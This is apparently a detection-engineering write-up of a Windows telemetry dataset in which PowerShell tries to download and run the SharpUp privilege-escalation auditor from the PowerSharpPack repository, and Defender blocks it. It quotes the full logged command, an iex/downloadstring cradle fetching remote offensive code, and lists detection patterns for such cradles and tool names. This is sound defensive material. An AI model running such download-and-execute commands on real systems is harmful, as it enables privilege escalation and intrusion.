# T1082-22: System Information Discovery — WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors

## Technique Context

T1082 System Information Discovery involves adversaries attempting to collect detailed information about the system and its environment. This technique is fundamental to post-compromise activities as attackers need to understand their operating environment before escalating privileges, moving laterally, or persisting. In this specific test, the technique is demonstrated through the WinPwn framework's PowerSharpPack collection, specifically using SharpUp - a C# port of PowerUp that audits Windows systems for common privilege escalation vectors.

The detection community focuses heavily on monitoring system enumeration activities because they're reliable indicators of adversary reconnaissance. Key behavioral patterns include excessive queries to system information APIs, privilege enumeration commands, service discovery activities, and the loading of .NET assemblies for in-memory execution of tools like SharpUp.

## What This Dataset Contains

The dataset captures a PowerShell-based attack chain attempting to download and execute SharpUp for privilege escalation enumeration:

Security event 4688 shows the creation of a PowerShell process with command line: `"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command "audit"}`

Sysmon event 1 captures the same PowerShell process creation with full command line details showing the attempt to download the Invoke-SharpUp.ps1 script from the PowerSharpPack repository.

PowerShell event 4103 logs the New-Object cmdlet invocation creating a `net.webclient` object, followed by PowerShell event 4100 showing Windows Defender blocking the execution: "At line:1 char:1 + function Invoke-SharpUp + ~~~~~~~~~~~~~~~~~~~~~~~ This script contains malicious content and has been blocked by your antivirus software."

Sysmon events 22 and 3 capture the DNS query and network connection to `raw.githubusercontent.com` (IP 185.199.108.133) on port 443, showing the download attempt succeeded at the network level.

Security event 4703 records token rights adjustment with multiple high-privilege rights enabled including SeBackupPrivilege, SeRestorePrivilege, SeLoadDriverPrivilege, and SeTakeOwnershipPrivilege.

## What This Dataset Does Not Contain

The dataset does not contain actual system enumeration telemetry because Windows Defender successfully blocked the malicious PowerShell script before it could execute. There are no registry queries, WMI calls, service enumeration activities, or other system discovery behaviors that would normally be generated by SharpUp's audit functionality. The AMSI (Antivirus Scan Interface) integration blocked the script at the PowerShell engine level, preventing any privileged enumeration commands from running.

Additionally, while Sysmon captured the whoami.exe execution (event 1 with T1033 technique tag), this appears to be part of the test framework rather than the blocked SharpUp execution itself.

## Assessment

This dataset provides excellent telemetry for detecting attempted deployment of .NET-based privilege escalation tools via PowerShell, but limited value for understanding the actual system discovery behaviors these tools perform. The security events with full command line logging are particularly valuable, clearly showing the attack chain from initial PowerShell execution through the attempted script download and blocked execution.

The combination of Security 4688 events with command line logging, Sysmon process creation events, and PowerShell operational logs creates multiple detection opportunities for this attack pattern. However, the effectiveness of Windows Defender means this dataset better demonstrates prevention telemetry than actual technique execution.

## Detection Opportunities Present in This Data

1. **PowerShell script download patterns** - Monitor for `iex(new-object net.webclient).downloadstring()` patterns in Security 4688 command lines and PowerShell 4104 script block logs

2. **Known malicious repository access** - Alert on network connections to `raw.githubusercontent.com` combined with PowerShell process network activity (Sysmon event 3)

3. **AMSI blocking events** - PowerShell event 4100 with "malicious content" blocked messages, particularly when preceded by web client object creation

4. **Privilege escalation tool indicators** - Command lines containing references to "SharpUp", "PowerSharpPack", or "Invoke-SharpUp" functions

5. **Token privilege escalation** - Security event 4703 showing elevation of sensitive privileges like SeBackupPrivilege and SeLoadDriverPrivilege in PowerShell processes

6. **Base64 encoded .NET assembly loading** - PowerShell script blocks containing `[System.Reflection.Assembly]::Load()` calls with base64 data (visible in blocked script content)

7. **Suspicious PowerShell DNS queries** - Sysmon event 22 DNS queries to code repositories from PowerShell processes, especially when correlated with failed script execution
